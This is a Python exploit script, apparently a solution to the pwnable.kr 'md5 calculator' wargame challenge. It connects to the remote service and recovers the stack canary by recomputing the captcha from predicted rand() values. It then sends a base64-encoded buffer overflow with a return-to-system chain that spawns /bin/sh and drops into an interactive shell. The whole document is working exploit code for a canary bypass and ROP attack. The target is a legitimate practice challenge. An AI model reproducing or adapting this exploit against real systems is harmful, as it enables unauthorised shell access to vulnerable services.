from zio import *
import base64
import subprocess
import struct

#target = "./hash"
target = ("pwnable.kr", 9002)

def get_io(target):
	io = zio(target, timeout = 9999)

	io.read_until("input captcha : ")
	captcha = io.read_until("\n")
	io.write(captcha)
	io.read_until("then paste me!\n")

	return io, captcha
def run_cmd(cmd_str):
	process1 = subprocess.Popen(cmd_str, shell=False, stdout = subprocess.PIPE, stderr=subprocess.STDOUT)		  
	#print process1.communicate()[0]  
	total_line = ""
	while True:  
		line = process1.stdout.readline()  
		if not line:  
			break  
		total_line += line
	return total_line

def get_canary(captcha):
	args = ["/home/pxx/program/pwnable/Rookiss/2-md5-calc/main", "3", "8"]
	result = run_cmd(args)
	rand_array = result.strip().split(' ')
	print rand_array
	rand_array_int = [int(c) for c in rand_array]
	captcha_int = int(captcha)
	canary = captcha_int - rand_array_int[4] + rand_array_int[6] - rand_array_int[7] - rand_array_int[2] + rand_array_int[3] - rand_array_int[1] - rand_array_int[5]
	while canary < 0:
		canary &= 0xffffffff
	print  "calc", canary + (rand_array_int[4] - rand_array_int[6] + rand_array_int[7] + rand_array_int[2] - rand_array_int[3] + rand_array_int[1] + rand_array_int[5]) & 0xffffffff
	print canary
	return canary

def find_ret_addr(canary, io):
	raw_input(":")
	canary_str = struct.pack("I", canary)
	buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
	data = base64.encodestring(buff[:512] + canary_str + buff[512:]).replace('\n', '')
	print [hex(ord(c)) for c in data]
	io.write(data + '\n')
	io.interact()	

def rop_pwn(canary, io):

	#raw_input(":")
	canary_str = struct.pack("I", canary)

	system_call_addr = struct.pack("I", 0x08049187)
	ebx = struct.pack("I", 0x08049187)
	#cmd_addr = struct.pack("I", 0x08049187)
	gbuf_addr = struct.pack("I", 0x0804B0E0  + 717)
	cmd_addr = gbuf_addr

	shellcode = system_call_addr + cmd_addr

	buff = "a" * 524 + shellcode
	data = base64.encodestring(buff[:512] + canary_str + buff[512:]).replace('\n', '')
	print len(data) + 1
	data += "\x00" + "/bin/sh\x00"
	#print [hex(ord(c)) for c in data]
	io.write(data + '\n')
	io.interact()

while True:
	io, captcha = get_io(target)
	canary = get_canary(captcha)
	rop_pwn(canary, io)
#find_ret_addr(canary, io)
#find the pos is 524